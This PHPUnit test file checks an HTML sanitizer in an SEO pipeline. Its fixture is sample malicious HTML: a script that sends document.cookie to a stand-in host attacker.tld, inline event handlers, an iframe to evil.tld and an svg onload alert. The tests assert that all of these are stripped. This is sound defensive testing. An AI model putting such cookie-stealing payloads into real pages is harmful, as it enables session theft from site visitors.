<?php

declare(strict_types=1);

namespace JzGuilherme\SeoPipeline\Tests\Unit;

use JzGuilherme\SeoPipeline\Services\HtmlSanitizerService;
use PHPUnit\Framework\TestCase;

final class HtmlSanitizerServiceTest extends TestCase
{
    private HtmlSanitizerService $sanitizer;

    protected function setUp(): void
    {
        $this->sanitizer = new HtmlSanitizerService();
    }

    public function testStripsDangerousTagsAndInlineEventAttributes(): void
    {
        $maliciousHtml = <<<'HTML'
            <h2 id="title" onclick="stealCookies()">Especificações Principais</h2>
            <script>fetch('https://attacker.tld/steal?c=' + document.cookie)</script>
            <style>body { display: none; }</style>
            <iframe src="https://evil.tld"></iframe>
            <p style="color:red" onmouseover="evil()">Produto com <strong>alta durabilidade</strong> e <em>acabamento premium</em>.</p>
            <svg onload="alert(1)"><circle cx="50" cy="50" r="40"/></svg>
            <div><span>Texto dentro de div e span não permitidos</span></div>
            <ul class="list"><li data-id="1">Item 1</li><li>Item 2</li></ul>
        HTML;

        $sanitized = $this->sanitizer->sanitizeHtml($maliciousHtml);

        self::assertStringNotContainsString('<script>', $sanitized);
        self::assertStringNotContainsString('fetch(', $sanitized);
        self::assertStringNotContainsString('<style>', $sanitized);
        self::assertStringNotContainsString('<iframe', $sanitized);
        self::assertStringNotContainsString('<svg', $sanitized);
        self::assertStringNotContainsString('<div>', $sanitized);
        self::assertStringNotContainsString('<span>', $sanitized);
        self::assertStringNotContainsString('onclick', $sanitized);
        self::assertStringNotContainsString('onmouseover', $sanitized);
        self::assertStringNotContainsString('style=', $sanitized);
        self::assertStringNotContainsString('class=', $sanitized);
        self::assertStringNotContainsString('data-id=', $sanitized);

        self::assertStringContainsString('<h2>Especificações Principais</h2>', $sanitized);
        self::assertStringContainsString('<p>Produto com <strong>alta durabilidade</strong> e <em>acabamento premium</em>.</p>', $sanitized);
        self::assertStringContainsString('<ul><li>Item 1</li><li>Item 2</li></ul>', $sanitized);
    }

    public function testSanitizePlainTextRemovesHtmlAndNormalizesWhitespace(): void
    {
        $dirtyText = "  <b>Notebook</b>   Gamer \n\t <script>alert(1)</script> RTX &amp; Core i9  ";

        $clean = $this->sanitizer->sanitizePlainText($dirtyText);

        self::assertSame('Notebook Gamer RTX & Core i9', $clean);
    }
}
